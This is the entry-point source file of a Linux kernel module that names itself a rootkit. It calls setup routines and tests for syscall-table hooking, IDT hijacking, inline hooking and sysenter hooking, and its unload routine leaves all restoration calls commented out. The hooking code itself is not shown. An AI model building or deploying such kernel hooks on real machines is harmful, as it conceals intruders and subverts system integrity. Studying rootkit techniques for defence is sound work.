#include "slrk.h"
#include "tests.h"

#include <linux/module.h>
#include <linux/kernel.h>

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    idt_init();
    init_symbols();

    /* Run some tests */
    test_inline_hooking();
    test_syscall_tbl();
    test_idt_hijacking();
    test_sysenter();

    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
    /* Restore the changed entries or the whole table */
    //idt_restore();
    //syscall_tbl_restore();
    //ia32_syscall_tbl_restore();
    //sysenter_hook_disable();
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
